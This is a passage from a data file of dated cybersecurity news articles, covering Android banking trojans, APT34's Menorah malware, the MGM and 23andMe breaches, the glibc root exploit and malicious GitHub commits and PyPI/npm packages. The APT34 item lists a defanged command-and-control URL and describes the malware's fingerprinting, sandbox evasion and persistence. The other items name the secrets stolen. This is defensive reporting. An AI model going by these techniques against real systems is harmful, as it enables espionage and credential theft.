cybersecurity updates. Sign up now!GBHackers on security is a highly informative and reliable Cyber Security News platform that provides the latest and most relevant updates on Cyber Security News, Hacking News, Technology advancements, and Kali Linux tutorials on a daily basis. The platform is dedicated to keeping the community well-informed and up-to-date with the constantly evolving Cyber World."
   },
   {
      "time": "2023-10-08",
      "title": "GoldDigger Android trojan targets Vietnamese banking apps • The Register",
      "text": " Singapore-based infosec outfit Group-IB on Thursday released details of a new Android trojan that exploits the operating system's accessibility features to steal info that enables theft of personal information.The malware makes its way onto devices after users visit fake websites that manipulate them into downloading the app. Once installed, GoldDigger requests access to Android’s Accessibility Service – the feature designed to assist users with disabilities by allowing apps to interact with each other and modify the user interface.Permission to use the Accessibility Service means GoldDigger can monitor and manipulate a device's functions and view personal information such as banking app credentials and the content of SMS messages, and send that info to command-and-control servers. A code snippet found by the researchers suggests the malware attempts to bypass two factor authentication, and is designed to fool banking apps that it is making legitimate transactions.\"We have not confirmed that the Trojan operators use these capabilities at the time of writing. However, based on the behavior of other known Trojans similar to GoldDigger, we don't think they differ significantly,\" explained Group-IB.\"We are definitely observing a significant increase in the Android malware strains abusing the Accessibility Service. For Android malware trends, there is a noticeable shift away from the traditional use of web fakes,\" Sharmine Low, malware analyst at Group-IB, told The Register. Low said using the Accessibility Function was a \"much more invasive approach compared to generating individual web fake files for each specific target.\"GoldDigger's developers have left clues that their ambitions may reach beyond Vietnam. The malware includes translations in Chinese and Spanish, suggesting that countries where those languages are spoken may be next in line as targets.One way the security firm noted the malware could be prevented – aside from the usual check for updates, watch out for unusual permissions and adopting fraud protection services – is to keep the \"Install from Unknown Sources\" setting disabled by default on Android devices. Only if the setting is enabled can APKs from sources outside Google Play Store be installed. ®The Register   Biting the hand that feeds IT\n                        Copyright. All rights reserved © 1998–2023\n\n                    "
   },
   {
      "time": "2023-10-08",
      "title": "North Korea's Lazarus Group Launders $900 Million in Cryptocurrency",
      "text": " As much as $7 billion in cryptocurrency has been illicitly laundered through cross-chain crime, with the North Korea-linked Lazarus Group linked to the theft of roughly $900 million of those proceeds between July 2022 and July of this year.Cross-chain crime refers to the conversion of crypto assets from one token or blockchain to another, often in rapid succession, in an attempt to obfuscate their origin, making it a lucrative method for money laundering for crypto thefts and an alternative to traditional approaches like mixers.According to data gathered by Elliptic, the Lazarus Group's use of cross-chain bridges contributed to a majority of the 111% increase in the proportion of funds sent via such services.The threat actor has also been linked to the use of Avalanche Bridge to deposit more than 9,500 bitcoin, while simultaneously employing cross-chain solutions to move some of the plundered assets.\"As is evidenced by the assets ending up on the same blockchain on numerous occasions, these transactions have no legitimate business purpose other than to obfuscate their origin,\" Elliptic said. \"Bridging back-and-forth for the sake of obfuscation – i.e. 'chain-hopping' – is now a recognized money laundering typology.\"The disclosure comes as South Korea's National Intelligence Service (NIS) has warned of North Korea attacking its shipbuilding sector since the start of the year.Join us for our webinar to learn how to tackle challenges, launch a program, and choose the right solution.Join the conversation with security gurus to learn about technologies that can shield your web apps from stealthy attacks.Sign up for free and start receiving your daily dose of cybersecurity news, insights and tips."
   },
   {
      "time": "2023-10-08",
      "title": "Supermicro's BMC Firmware Found Vulnerable to Multiple Critical Vulnerabilities",
      "text": " A brief explainer of each of the vulnerabilities is below -\"This privilege allows to make the attack persistent even while the BMC component is rebooted and to move laterally within the compromised infrastructure, infecting other endpoints.\"The other six vulnerabilities – CVE-2023-40284, CVE-2023-40287, and CVE-2023-40288 in particular – could be used to create an account with admin privileges for the web server component of the BMC IPMI software.As a result, a remote attacker looking to take control of the servers could combine them with CVE-2023-40289 to perform command injection and achieve code execution. In a hypothetical scenario, this could play in the form of sending a phishing email bearing a booby-trapped link to the administrator's email address that, when clicked, triggers the execution of the XSS payload.There is presently no evidence of any malicious exploitation of the vulnerabilities in the wild, although Binarly said it observed more than 70,000 instances of internet-exposed Supermicro IPMI web interfaces at the start of October 2023.\"First, it is possible to remotely compromise the BMC system by exploiting vulnerabilities in the Web Server component exposed to the internet,\" the firmware security company explained.\"An attacker can then gain access to the Server's operating system via legitimate iKVM remote control BMC functionality or by flashing the UEFI of the target system with malicious firmware that allows persistent control of the host OS. From there, nothing prevents an attacker from lateral movement within the internal network, compromising other hosts.\"Join us for our webinar to learn how to tackle challenges, launch a program, and choose the right solution.Join the conversation with security gurus to learn about technologies that can shield your web apps from stealthy attacks.Sign up for free and start receiving your daily dose of cybersecurity news, insights and tips."
   },
   {
      "time": "2023-10-08",
      "title": "APT34 Deploys Phishing Attack With New Malware",
      "text": " BusinessImprove your risk posture with attack surface managementSecurity that enables business outcomesGain visibility and meet business needs with securityConnect with confidence from anywhere, on any deviceSecure users and key operations throughout your environmentMove faster than your adversaries with powerful purpose-built XDR, attack surface risk management, and zero trust capabilitiesMaximize effectiveness with proactive risk reduction and managed servicesUnderstand your attack surface, assess your risk in real time, and adjust policies across network, workloads, and devices from a single consoleDrive business value with measurable cybersecurity outcomesSee more, act fasterEvolve your security to mitigate threats quickly and effectivelyEnsure code runs only as intendedGain visibility and control with security designed for cloud environmentsProtect patient data, devices, and networks while meeting regulationsProtecting your factory environments – from traditional devices to state-of-the-art infrastructuresICS/OT Security for the oil and gas utility industryICS/OT Security for the electric utilityBridge threat protection and cyber risk managementOperationalize a zero trust strategyStop adversaries faster with a broader perspective and better context to hunt, detect, investigate, and respond to threats from a single platformDefend the endpoint through every stage of an attackOptimized prevention, detection, and response for endpoints, servers, and cloud workloadsThe most trusted cloud security platform for developers, security teams, and businessesLeverage complete visibility and rapid remediationSimplify security for your cloud-native applications with advanced container image scanning, policy-based admission control, and container runtime protectionSecurity for cloud file/object storage services leveraging cloud-native application architecturesAdvanced cloud-native network security detection, protection, and cyber threat disruption for your single and multi-cloud environments.Visibility and monitoring of open source vulnerabilities for SecOpsAs your organization continues to move data and apps to the cloud and transform your IT infrastructure, mitigating risk without slowing down the business is critical.Expand the power of XDR with network detection and responseProtect against known, unknown, and undisclosed vulnerabilities in your networkDetect and respond to targeted attacks moving inbound, outbound, and laterallyRedefine trust and secure digital transformation with continuous risk assessmentsStop phishing, malware, ransomware, fraud, and targeted attacks from infiltrating your enterpriseOn-premises and cloud protection against malware, malicious applications, and other mobile threatsKeep ahead of the latest threats and protect your critical data with ongoing threat prevention and analysisStop threats with comprehensive, set-it-and-forget-it protectionAugment security teams with 24/7/365 managed detection, response, and supportAugment threat detection with expertly managed detection and response (MDR) for email, endpoints, servers, cloud workloads, and networksOur trusted experts are on call whether you're experiencing a breach or looking to proactively improve your IR plansStop breaches with the best response and detection technology on the market and reduce clients’ downtime and claim costsGrow your business and protect your customers with the best-in-class complete, multilayered securityDeliver modern security operations services with our industry-leading XDRPartner with a leading expert in cybersecurity, leverage proven solutions designed for MSPsAdd market-leading security to your cloud service offerings – no matter which platform you useIncrease revenue with industry-leading securityDiscover the possibilitiesWe work with the best to help you optimize performance and valueContent has been added to your FolioAPT & Targeted AttacksWe observed and tracked the advanced persistent threat (APT) APT34 group with a new malware variant accompanying a phishing attack comparatively similar to the SideTwist backdoor malware. Following the campaign, the group abused a fake license registration form of an African government agency to target a victim in Saudi Arabia.By: Mohamed Fahmy, Mahmoud Zohdy\n\t\t\n\t\t\tSeptember 29, 2023\nRead time:  ( words)\n\tSave to FolioDuring our investigation, there was little information about the victims targeted by this malware. But the file that APT34 used for this attack is called “MyCv.doc,” a license registration form related to the Seychelles Licensing Authority. However, we noted that the document contained pricing information in Saudi Riyal, which might indicate that the targeted victim was an organization inside the Kingdom of Saudi Arabia. This blog post provides an analysis of the group’s latest malware and its capabilities, shows the attack process, and details the attackers’ infrastructure.APT34 background and targetingInfection routineThe infection starts with a malicious document dropping a hardcoded malware and creates a scheduled task for persistence once the targeted victim opens the document. The malicious document contains hidden macros responsible for dropping a .NET malware into the <%ALLUSERSPROFILE%\\Office356> directory, naming it Menorah.exe. It then creates a scheduled task named \"OneDriveStandaloneUpdater\" to execute the Menorah.exe malware. The image in Figure 2 shows a portion of the macros' functions responsible for string transformation, decoding, and the creation of the scheduled task.Malware analysisThe .NET-written malware delivered through the malicious document is primarily deployed for cyberespionage and possesses multifaceted capabilities. The malware can fingerprint the targeted machine, list directories and files, upload selected files from the compromised system, execute shell commends, and download files to the system.Compared to the previous variant of SideTwist, the new variant has more functions to hash the traffic to the command and control (C&C) server and make it stealthier to avoid detection. Initially, the malware conducts a specific argument check during execution to ensure the correct flow of its operations. In the absence of the specified argument, the malware will terminate and stop its execution. The regular check ensures the routine’s and components’ stealth, and detects if the malware is in an analytic environment like a sandbox. If the argument determines that it’s running inside a sandbox, the malware will run without the argument and terminate itself.We identified the C&C server, http[:]//tecforsc-001-site1[.]gtempurl.com/ads.asp, as a string subsequently used for HTTP communication and to create a timer to repeat a specific code every 32,000 milliseconds (or every 32 seconds) as a way to organize communication with the C&C server.Then, the malware fingerprints the machine by getting the machine name and username in this format: {MachineNameUsername}. The malware continues to encode the string into ASCII then calculates for the MD5 hash from it. The MD5 hash is combined with the {MachineNameUsername} in the format {‘d@{MD5 hash}@MachineName|Username} XOR with a hardcoded string and encoded in Base64, creating a fingerprint for the compromised system. This fingerprint is sent to the C&C server as the content of an HTTP request, as shown in the figure below.Unfortunately, the C&C server was inactive at the time of analysis. However, from the analysis for functions responsible for parsing the C&C, we expected that the response returned will be an encrypted massage and further encoded in Base64. The decrypted and decoded message split into an array, and each value inside it represents part of the message received from the C&C server. Based on these values, the malware will have specific actions on the machine.From static analysis, we observed the malware capable of executing a command received from the C&C server, list directory and files on the compromised system, and upload specific files to server and download files. The following are the malware’s commands, values, and actions:Similarities to backdoor SideTwistConclusionsThe similarities to the SideTwist backdoor suggests that APT34 is in continuous-development mode, changing up and trying which routines and techniques will work. Typical of APT groups, APT34 demonstrates their vast resources and varied skills, and will likely persist in customizing routines and social engineering techniques to use per targeted organization to ensure success in intrusions, stealth, and cyber espionage. The earlier variant of SideTwist is written in C, and this latest variant has a very similar set of functions but in a .NET implementation.Indicators of Compromise (IOCs)URLhxxp://tecforsc-001-site1[.]gtempurl[.]com/ads.aspMohamed FahmyThreat ResearcherMahmoud ZohdyThreat ResearcherTry our services free for 30 daysSelect a country / regionCopyright ©2023 Trend Micro Incorporated. All rights reserved"
   },
   {
      "time": "2023-10-07",
      "title": "Suspected Crime Gang Hacks Israeli President's Telegram Account",
      "text": " A crime-related entity recently gained access to the Telegram account of Israeli president Isaac Herzog.Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."
   },
   {
      "time": "2023-10-07",
      "title": "NSA and CISA reveal top 10 cybersecurity misconfigurations",
      "text": " The National Security Agency (NSA) and the Cybersecurity and Infrastructure Security Agency (CISA) revealed today the top ten most common cybersecurity misconfigurations discovered by their red and blue teams in the networks of large organizations.Today's advisory also details what tactics, techniques, and procedures (TTPs) threat actors use to successfully exploit these misconfigurations with various goals, including gaining access to, moving laterally, and targeting sensitive information or systems.The information included in the report was collected by the two agencies' Red and Blue teams during assessments and during incident response activities.This underscores the critical need for software manufacturers to adopt secure-by-design principles, thereby mitigating the risk of compromise.​Goldstein urged software manufacturers to embrace a set of proactive practices, aiming to effectively tackle these misconfigurations and alleviate the challenges faced by network defenders.These include integrating security controls into the product architecture from the initial stages of development and throughout the software development lifecycle.Furthermore, manufacturers should stop using default passwords and ensure that compromising a single security control does not jeopardize the entire system's integrity. Taking proactive measures to eliminate whole categories of vulnerabilities, such as utilizing memory-safe coding languages or implementing parameterized queries, is also essential.Lastly, Goldstein said it's imperative to mandate multifactor authentication (MFA) for privileged users and establish MFA as a default feature, making it a standard practice rather than an optional choice.Mitigations that would have this effect include:Besides applying the outline mitigations, NSA and CISA recommend \"exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework\" in today's advisory.The two federal agencies also advise testing existing security controls inventory to assess their performance against the ATT&CK techniques described in the advisory."
   },
   {
      "time": "2023-10-07",
      "title": "\r\n\tAWS Mandates Multi-Factor Authentication from 2024 - Infosecurity Magazine\r\n",
      "text": " UK / EMEA News Reporter, Infosecurity MagazineAmazon Web Services (AWS) said it will require multi-factor authentication (MFA) for all privileged accounts starting mid-2024, in a bid to improve default security and reduce the risk of account hijacking.From that time, any customers signing into the AWS Management Console with the root user of an AWS Organizations management account will be required to use MFA to proceed, chief security officer, Steve Schmidt said in a blog post.“Customers who must enable MFA will be notified of the upcoming change through multiple channels, including a prompt when they sign into the console,” he added.“We will expand this program throughout 2024 to additional scenarios such as standalone accounts (those outside an organization in AWS Organizations) as we release features that make MFA even easier to adopt and manage at scale.”The move follows previous AWS efforts to improve take up of MFA. The firm began offering a free security key to account owners in the US from fall 2021, and a year later enabled organizations to register up to eight MFA devices per account root user or per IAM user in AWS.“While the requirement to enable MFA for root users of AWS Organizations management accounts is coming in 2024, we strongly encourage our customers to get started today by enabling MFA not only for their root users, but for all user types in their environments.”This happened in nearly two-fifths (36%) of real-world cloud incidents investigated by the security vendor, with credentials either discovered during an attack or stolen/phished prior to targeting an account."
   },
   {
      "time": "2023-10-07",
      "title": "MGM Resorts ransomware attack led to $100 million loss, data theft",
      "text": " MGM Resorts reveals that last month's cyberattack cost the company $100 million and allowed the hackers to steal customers' personal information.These hackers breached MGM's network using social engineering, stole sensitive data, and encrypted over a hundred ESXi hypervisors.The impact of the IT system outage, which continued for an extended period, was substantial as the cyberattack disrupted a broad range of its business operations.\"While the Company experienced impacts to occupancy due to the availability of bookings through the Company's website and mobile applications, it was mostly contained to the month of September which was 88%.\"In addition to losing $100 million in earnings, MGM also suffered less than $10 million in one-time expenses for risk remediation, legal fees, third-party advisory, and incident response measures. MGM says it expects to be fully covered by its cybersecurity insurance.Overall, MGM asserts that the financial impact will be predominantly confined to Q3 2023 and does not anticipate any significant effect on its annual financial performance.MGM Resorts believes that the incident has been contained, and all of their guest-facing systems have now been fully restored, with any remaining systems in offline status expected to resume normal operations in the coming days.MGM is also warning that the threat actors managed to steal the personal information of customers who transacted with MGM before March 2019.MGM concludes that its investigation has not unearthed signs that the incident exposed customer passwords, bank account numbers, and payment card information.The company provides free credit monitoring and identity protection services to those impacted by the data breach and warns customers to remain vigilant against unsolicited communications.\"We recommend that you remain vigilant for incidents of fraud and identity theft by reviewing account statements and monitoring your free credit reports,\" warns MGM Resorts.\"We also recommend that you remain alert for unsolicited communications involving your personal information.\""
   },
   {
      "time": "2023-10-07",
      "title": "'Operation Jacana' Reveals DinodasRAT Custom Backdoor",
      "text": " A fresh malware threat dubbed \"DinodasRAT\" has been uncovered, after being used in a targeted cyber-espionage campaign against a governmental entity in Guyana.The malware got its name based on the use of \"Din\" at the beginning of each of the victim identifiers it sends to the attackers, and that string's similarity to the name of the diminutive hobbit Dinodas Brandybuck from The Lord of the Rings. Perhaps related: DinodasRAT uses the Tiny encryption algorithm to lock away its communications and exfiltration activities from prying eyes.The attack could be in retaliation for recent hiccups in Guyana–China diplomatic relations, according to ESET, such as Guyana's arrest of three people in a money-laundering investigation involving Chinese companies. Those allegations were disputed by the local Chinese embassy.Interestingly, one lure mentioned a \"Guyanese fugitive in Vietnam,\" and served malware from a legitimate domain ending with gov.vn.\"This domain indicates a Vietnamese governmental website; thus, we believe that the operators were able to compromise a Vietnamese governmental entity and use its infrastructure to host malware samples,\" said ESET researcher Fernando Tavella in the report — again suggesting that the activity is the work of a more sophisticated player.Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."
   },
   {
      "time": "2023-10-07",
      "title": "Genetics firm 23andMe says user data stolen in credential stuffing attack",
      "text": " 23andMe has confirmed to BleepingComputer that it is aware of user data from its platform circulating on hacker forums and attributes the leak to a credential-stuffing attack.23andMe is a U.S. biotechnology and genomics firm offering genetic testing services to customers who send a saliva sample to its labs and get back an ancestry and genetic predispositions report.Recently, a threat actor leaked samples of data that was allegedly stolen from a genetics firm and, a few days later, offered to sell data packs belonging to 23andMe customers.The initial data leak was limited, with the threat actor releasing 1 million lines of data for Ashkenazi people. However, on October 4, the threat actor offered to sell data profiles in bulk for $1-$10 per 23andMe account, depending on how many were purchased.A 23andMe spokesperson confirmed the data is legitimate and told BleepingComputer that the threat actors used exposed credentials from other breaches to access 23andMe accounts and steal the sensitive data.\"We were made aware that certain 23andMe customer profile information was compiled through access to individual 23andMe.com accounts,\" stated 23andMe's spokesperson\"We do not have any indication at this time that there has been a data security incident within our systems.\"\"Rather, the preliminary results of this investigation suggest that the login credentials used in these access attempts may have been gathered by a threat actor from data leaked during incidents involving other online platforms where users have recycled login credentials.\"The information that has been exposed from this incident includes full names, usernames, profile photos, sex, date of birth, genetic ancestry results, and geographical location.BleepingComputer has also learned that the number of accounts sold by the cybercriminal does not reflect the number of 23andMe accounts breached using exposed credentials.The compromised accounts had opted into the platform's 'DNA Relatives' feature, which allows users to find genetic relatives and connect with them.The threat actor accessed a small number of 23andMe accounts and then scraped the data of their DNA Relative matches, which shows how opting into a feature can have unexpected privacy consequences.Users should refrain from reusing passwords and consistently employ strong, distinct credentials for every online account they have."
   },
   {
      "time": "2023-10-07",
      "title": "FTC warns of ‘staggering’ losses to social media scams since 2021",
      "text": " The Federal Trade Commission says Americans have lost at least $2.7 billion to social media scams since 2021, with the actual number likely many times larger due to severe under-reporting. \"And because the vast majority of frauds are not reported, this figure reflects just a small fraction of the public harm.\"In social media scams, fraudsters often advertise fake products, trying to trick potential victims into making payments. Subsequently, these crooks make off with the money without actually delivering on their promise.Alternatively, they might entice individuals with false investment opportunities, frequently related to cryptocurrency. Another tactic involves sending unexpected friend requests, posing as romantic prospects, only to later solicit money from their targets.The FTC advised U.S. consumers today to exercise caution and safeguard themselves against such scams, encouraging individuals at risk to restrict their social media posts and contacts, reaching out directly by phone if someone, even a purported friend or relative, solicits money through social media.Americans were also urged to exercise caution if someone on social media pushes for friendship or romance out of the blue. In such cases, it's advised to exercise caution, read about romance scams, and refrain from sending money to individuals not met in person.Additionally, consumers should research companies thoroughly before making purchases since online searches using a company's name and keywords like \"scam\" or \"complaint\" can provide valuable insights.\"Most of these reports come from people who never received the items they ordered after responding to an ad on Facebook or Instagram.\"That amounted to a massive 18-fold increase over 2017 losses and more than double compared to those reported during 2020.At the time, the agency revealed that roughly 2.4 million Americans reported financial losses due to scams last year, with a majority falling prey to impostor and online shopping scams in 2022."
   },
   {
      "time": "2023-10-07",
      "title": "Legions of Critical Infrastructure Devices Subject to Cyber Targeting",
      "text": " There are at least 100,000 industrial control systems (ICS) exposed to the public Internet around the world, controlling a host of critical operational technologies (OT) like power grids, water systems, and building management systems (BMS). While that's a big number, researchers note that quantifying true cyber-risk from that exposure means examining which protocols the gear uses.In a recent analysis, researchers from cyber-risk handicapper Bitsight reached the 100,000 number by inventorying reachable devices that use the top 10 most popular and widely used ICS protocols (including Modbus, KNX, BACnet, Niagara Fox, and others.)\"These ICS devices are used to control much of the physical infrastructure in our society, from traffic lights to vaccine production,\" according to a recent report from the firm. \"Disruption of these systems could lead to significant business disruption, threats to human safety, data and intellectual property (IP) compromise, national security threats, and more.\"Pedro Umbelino, principal security researcher at Bitsight, notes that there are few, if any, reasons for this type of equipment to be directly reachable via the Internet, so the risk level seems like a soluble problem.\"The systems we identified as Internet-facing could be due to misconfigurations, or neglect of best practices,\" he explains. \"Typically, attackers scan for Internet-facing systems and then gather information to determine if that system has a vulnerability. So if systems are behind a firewall or otherwise not Internet facing, then much of the risk of exploitation is mitigated.\"Understanding risk within ICS environments takes more than simply determining how many devices are reachable from the Internet. Specifically, the use of different protocols can be important clues in determining where cyberattackers might be probing for weaknesses.\"Some protocols we explored lack security measures, like basic authentication, leaving the devices pretty much open to anyone,\" he says.\"Other protocols are very verbose, clearly indicating the brand, model, and version of the device, hugely simplifying an attacker's task to search for readily available exploits,\" Umbelino explains. \"The adoption of different protocols indicates different devices are present in an organization's exposed surface. This implies different vendors, different supply chains, [and] different software running.\"Organizations should also be aware that tailoring attacks by protocol also could help with geotargeting. Bitsight pointed out that exposed industrial control systems using CODESYS, KNX, Moxa Nport, and S7 are largely concentrated in the European Union (EU). Meanwhile, exposed systems using ATG and BACnet largely reside in the US. Modbus and Niagara Fox on the other hand are present globally.The takeaway is that ICS-owning organizations can inventory their protocol use, and use that as a variable to identify risk and inform their OT/ICS security strategies, Umbelino says. For instance, it may not always be practical to reconfigure an entire critical infrastructure environment to eliminate Internet-facing points, so knowing where to focus first can be invaluable.While Bitsight's topline findings should signal a wakeup call for critical infrastructure stakeholders everywhere, it's worth noting that the level of ICS exposure has actually declined over time, even amid the move to \"smart\" OT environments and more digitization. In 2019, the number of exposed ICS devices within the parameters of the study sat at nearly 140,000.From a practical standpoint, owners of ICS environments can shore up their security by taking some common-sense steps, according to Bitsight:\"In a nutshell, as a rule of thumb: reduce exposure,\" Umbelino says. \"Industrial control systems do not belong on the public Internet. Use firewalls, configure access controls, take advantage of virtual private networks or any other mechanism that prevents the devices from being widely reachable.\"Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."
   },
   {
      "time": "2023-10-07",
      "title": "Cisco Emergency Responder is affected by a critical Static Credentials bug. Fix it immediately!",
      "text": " Cisco released security updates to address a critical vulnerability, tracked as CVE-2023-20101 (CVSS score: 9.8), impacting Emergency Responder. A remote, unauthenticated attacker can exploit the vulnerability to log in to susceptible systems using hard-coded credentials that cannot be changed.The vulnerability was discovered as part of an internal security testing activity.The root cause of the vulnerability is the presence of hardcoded credentials for the root account which was created during the development phase.The vulnerability impacts Emergency Responder Release 12.5(1)SU4, the IT giant fixed the issue with the release of release 12.5(1)SU5. The company states that there are no workarounds that address this issue.The Cisco PSIRT is not aware of any attacks exploiting this vulnerability.\nCopyright@securityaffairs 2023 "
   },
   {
      "time": "2023-10-07",
      "title": "Exploits released for Linux flaw giving root on major distros",
      "text": " Proof-of-concept exploits have already surfaced online for a high-severity flaw in GNU C Library's dynamic loader, allowing local attackers to gain root privileges on major Linux distributions.Attackers can trigger it using a maliciously crafted GLIBC_TUNABLES environment variable processed by the ld.so dynamic loader to gain arbitrary code execution with root privileges when launching binaries with SUID permission.While his exploit can be used against a limited number of targets, the PoC also includes instructions on adding additional ones by identifying workable offset for each system's ld.so dynamic loader.Other researchers are also developing and rapidly releasing their own CVE-2023-4911 exploits on GitHub and elsewhere, although BleepingComputer has yet to confirm they're working.​Administrators must act promptly due to the significant threat posed by this security flaw, which grants complete root access to systems running the latest releases of widely used Linux platforms, including Fedora, Ubuntu, and Debian.While Alpine Linux admins, a distro unaffected by this vulnerability, don't have to worry about patching their systems, those on other affected systems must prioritize patching to safeguard their systems' integrity and security.\"Our successful exploitation, leading to full root privileges on major distributions like Fedora, Ubuntu, and Debian, highlights this vulnerability's severity and widespread nature,\" said Saeed Abbasi, Product Manager at Qualys' Threat Research Unit, on Tuesday.\"Although we are withholding our exploit code for now, the ease with which the buffer overflow can be transformed into a data-only attack implies that other research teams could soon produce and release exploits. This could put countless systems at risk, especially given the extensive use of glibc across Linux distributions.\""
   },
   {
      "time": "2023-09-28",
      "title": "\r\n\tNCSC Launches Cyber Incident Exercise Scheme - Infosecurity Magazine\r\n",
      "text": " UK / EMEA News Reporter, Infosecurity MagazineThe UK’s National Cyber Security Centre (NCSC) has ramped up efforts to encourage firms to run incident response exercises, with a new scheme to certify assured providers.The agency said it has chosen long-time partners CREST and IASME to be its delivery partners. They will assess the suitability of organizations to become Assured Service Providers in a new Cyber Incident Exercising (CIE) scheme.They are both now ready to accept enquiries from UK-based providers of cyber-incident exercise services.“We are determined that companies of any size can apply to join any of our schemes. We particularly welcome companies located in or serving geographically remote or under-represented areas,” the NCSC said in a blog post.“Similarly, if your company is working hard to address issues of under-representation in the cybersecurity workforce, we’d love to see your application.”Companies will be assessed in their ability to deliver two types of incident response exercise.Tabletop exercises are discussion-based sessions, involving conversations between participants about their roles and responsibilities, activities and “key decision points” for a pre-agreed scenario.What the NCSC calls “live-play sessions” involve responding in real-time to a pre-agreed incident scenario, although these are more suited to mature organizations looking for detailed validation of their plans, the agency said.These exercises are only intended to simulate incidents involving a single organization, rather than a national emergency or something impacting a large section of the population, the NCSC clarified."
   },
   {
      "time": "2023-09-28",
      "title": "\r\n\tBEC Attacks Increase By 279% in Healthcare - Infosecurity Magazine\r\n",
      "text": " Freelance JournalistBusiness Email Compromise (BEC) attacks in the healthcare sector have seen a 279% increase this year, shows a new report published by Abnormal Security.The data also suggests a 167% increase in advanced email attacks, including BEC, credential phishing, malware and extortion.Further, the average number of advanced email attacks per 1000 mailboxes in the healthcare sector started the year at 55.66 in January 2023 and peaked at over 100 in March. Although the numbers have stabilized at approximately 61.16 attacks per 1000 mailboxes for the rest of the year, historical trends suggest a potential increase during the holiday season.While not as voluminous as some other email threats, BEC attacks pose the most significant financial risks, Abnormal explained.The FBI reports that the average financial loss per BEC attack is $125,000. These attacks are increasingly dangerous because they are often text-based, sent from legitimate domains and lack typical indicators of compromise.Responding to such an innocuous-seeming email could result in the attacker gaining access to critical financial information and potentially diverting payments, causing substantial losses to the healthcare network.As the year progresses, the healthcare industry should prepare for a continued increase in email attacks, Abnormal wrote. “Fortunately, there are solutions available to prevent these attacks from reaching doctors, nurses, and healthcare staff. By embracing sophisticated cloud email security, healthcare organizations can dramatically improve their cybersecurity practices.”"
   },
   {
      "time": "2023-09-28",
      "title": "GitHub repos bombarded by info-stealing commits masked as Dependabot",
      "text": " Hackers are breaching GitHub accounts and inserting malicious code disguised as Dependabot contributions to steal authentication secrets and passwords from developers.The campaign unfolded in July 2023, when researchers discovered unusual commits on hundreds of public and private repositories forged to appear as Dependabot commits.Dependabot is an automated tool provided by GitHub that scans projects for vulnerable dependencies and then automatically issues pull requests to install the updated versions.The attack began with the attackers somehow obtaining their targets' personal GitHub access tokens, which Checkmarx has no insight into.The threat actors then appear to be using automated scripts to create fake commit messages titled \"fix\" that appear to be by the user account \"dependabot[bot].\"These commits introduce malicious code into the project that performs the following two actions:The secrets exfiltration is achieved by adding the GitHub action file \"hook.yml\" as a new workflow triggered on every code push event on the impacted repository.The password-stealer component injects obfuscated JavaScript into the end of all JavaScript (.js) files that load the following script from a remote site. This script will monitor for form submissions to steal passwords from any form inputs of type 'password.'As many compromised tokens also granted access to private repositories, the attack affected both public and private GitHub repositories.Checkmarx's analysts examined the logs from some victims and found that their accounts were compromised using stolen PATs (personal access tokens).These tokens are stored locally on the developer's computers and can be used to log in to GitHub without going through 2FA (two-factor authentication) steps.\"Sadly, the token's access log activity is not visible in the account's audit log. So if you're token got compromised, you can't know for sure because the access logs are missing,\" warns CheckmarxAlthough the cybersecurity firm didn't reach a concrete conclusion on the exact means by which the attackers stole these tokens, they assume it might be through a malware infection possibly introduced to the developer's device via a malicious package.Most compromised users are from Indonesia, implying a targeted attack tailored to this demographic. However, the available evidence doesn't provide specific details about the theme."
   },
   {
      "time": "2023-09-28",
      "title": "SSH keys stolen by stream of malicious PyPI and npm packages",
      "text": " A stream of malicious npm and PyPi packages have been found stealing a wide range of sensitive data from software developers on the platforms.Phylum reports that after a brief operational hiatus on September 16 and 17, the attack has resumed and expanded to the PyPI ecosystem.Since the start of the campaign, the attackers have uploaded 45 packages on npm (40) and PyPI (5), with variants in the code indicating a rapid evolution in the attack.However, it is worth noting that the following packages utilized typosquatting to resemble legitimate popular packages, which can trick developers into installing them:According to Phylum, at least seven distinct attack waves and several phases featured code modifications to enhance stealth and add more specific targeting.The first attack waves occurred between September 12 and 15, with the threat actors uploading new package sets daily, reaching a total of 33 packages.The later attack waves occurred on September 18 (three packages), September 20 (five packages), and September 24 (4 packages).In the initial waves, the packages had hardcoded data collection and exfiltration routines, containing the data collection code in plain text form internally, which made them susceptible to detection.The middle iterations introduced more complex mechanisms like retrieving and executing the data-collecting bash script from an external domain.Also, the authors added a \"preinstall\" hook to run malicious JavaScript automatically upon installation.The most recent packages utilized base64 encoding to evade analysis, which was later upgraded to double base64 encoding.In general, the attackers engaged in a continuous code testing and refinement process and even delivered packages that specialized in some aspects of data collection more than others.The data stolen by the packages includes sensitive machine and user information.Collected machine and user details include hostname, username, current path, OS version, external and internal IP addresses, and Python version for PyPI packages.These details and the Kubernetes configurations stored on kubeconfig files and SSH private keys in ~/.ssh/id_rsa are written in a text file (ConceptualTest.txt) and sent to the attackers' servers.The stolen information can be used to expose the real identities of developers and give the attackers unauthorized access to systems, servers, or infrastructure accessible through the stolen SSH private keys.If stolen Kubernetes configurations contain credentials to access clusters, the attackers could modify deployments, add malicious containers, access sensitive data stored in the cluster, move laterally, or launch a ransomware attack.Users of code distribution platforms such as PyPI and npm are advised to be cautious with what packages they download and launch on their systems, as there's a constant influx of malware in those ecosystems."
   },
   {
      "time": "2023-09-28",
      "title": "\r\n\tSimple Membership Plugin Flaws Expose WordPress Sites - Infosecurity Magazine\r\n",
      "text": " Freelance JournalistTwo new security flaws in the popular Simple Membership plugin for WordPress, affecting versions 4.3.4 and below, have been identified, leading to potential privilege escalation issues. With over 50,000 active installations, the plugin developed by smp7 and wp.insider is widely used for custom membership management on WordPress sites.The flaws identified by Patchstack security researchers include an Unauthenticated Membership Role Privilege Escalation vulnerability (CVE-2023-41957) and an Authenticated Account Takeover vulnerability (CVE-2023-41956).In the former, unauthenticated users could register accounts with arbitrary membership levels, while the latter allowed authenticated users to take over any member account through an insecure password reset process. The Unauthenticated Membership Role Privilege Escalation vulnerability primarily hinges on a function that handles the registration process.“The function handles the process of password reset through a reset password link feature. In the plugin context, the user can enable password reset through a link that will be sent to the user’s email,” Patchstack wrote in an advisory published earlier today.A critical condition exists when the function can be manipulated through some GET parameters, enabling users to register with any membership level from an arbitrary member account.In the Authenticated Account Takeover vulnerability, a separate function handles password reset through 